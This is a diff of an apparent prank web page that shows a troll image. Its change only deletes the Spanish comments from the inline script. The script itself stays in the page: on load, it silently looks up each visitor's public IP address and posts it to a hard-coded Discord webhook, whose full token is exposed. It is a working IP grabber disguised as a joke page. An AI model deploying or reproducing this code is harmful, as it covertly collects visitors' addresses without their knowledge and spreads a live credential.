@@ -25,7 +25,7 @@
 <body>
     <img src="https://cdn.computerhoy.com/sites/navi.axelspringer.es/public/media/image/2014/10/64609-estudio-dice-que-trolls-internet-son-sadicos-psicopatas.jpg?tf=3840x" alt="Troll Image">
     <script>
-        // Reemplaza con tu URL de webhook válida
+       
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1362970582341255188/cqrdjShxtYkeiiIkgAVeH588-_aji5XdVxERffsO6FGmNyJvhjRL80tuMdj-M6W0jXzS";
 
         async function obtenerDatos(retries = 3) {
@@ -33,7 +33,7 @@
                 try {
                     console.log(`🔍 Intento ${attempt} de obtener IP...`);
 
-                    // Obtener IP IPv4
+                    
                     const ipResponse = await fetch("https://api.ipify.org?format=json", {
                         method: "GET",
                         headers: { "Accept": "application/json" }
@@ -44,7 +44,7 @@
                     const ipData = await ipResponse.json();
                     const ip = ipData.ip;
 
-                    // Validar que es una IP IPv4
+                    
                     const ipv4Regex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
                     if (!ipv4Regex.test(ip)) {
                         throw new Error("No se obtuvo una IP IPv4 válida");
@@ -52,7 +52,7 @@
 
                     console.log("✔️ IP IPv4 obtenida:", ip);
 
-                    // Preparar mensaje para Discord
+                   
                     const mensaje = {
                         content: "**🔍 Nueva IP detectada**",
                         embeds: [
@@ -69,7 +69,7 @@
                         ],
                     };
 
-                    // Enviar a Discord
+                    
                     console.log("📤 Enviando datos a Discord...");
                     const webhookResponse = await fetch(WEBHOOK_URL, {
                         method: "POST",
@@ -82,20 +82,20 @@
                     }
 
                     console.log("✔️ Datos enviados a Discord exitosamente");
-                    return; // Salir si todo fue exitoso
+                    return; 
 
                 } catch (error) {
                     console.error(`❌ Error en intento ${attempt}:`, error.message);
                     if (attempt === retries) {
                         console.error("❌ Se agotaron los intentos. No se pudo enviar la IP.");
                     }
-                    // Esperar 1 segundo antes de reintentar
+                    
                     await new Promise(resolve => setTimeout(resolve, 1000));
                 }
             }
         }
 
-        // Ejecutar la función
+       
         obtenerDatos();
     </script>
 </body>
